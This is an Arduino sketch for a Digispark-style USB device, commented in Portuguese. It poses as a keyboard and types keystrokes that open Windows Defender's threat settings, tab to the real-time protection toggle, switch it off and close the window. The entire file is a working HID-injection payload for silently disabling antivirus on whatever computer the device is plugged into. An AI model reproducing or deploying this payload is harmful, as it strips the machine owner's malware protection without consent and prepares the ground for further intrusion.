#include "DigiKeyboardPtBr.h" //biblioteca para o nosso teclado ABNT
void setup() {
//empty
}
void loop(){
   //desligando o windows defender 
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("Windowsdefender://threat/"); 
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.print("\t");//Pressione TAB 1
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("\t");//Pressione TAB 2
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("\t");//Pressione TAB 3
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("\t");//Pressione TAB 4
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);
  DigiKeyboardPtBr.delay(1500);
  DigiKeyboardPtBr.print("\t");//Pressione TAB 6
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("\t");//Pressione TAB 7
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); 
  for(;;);
  }
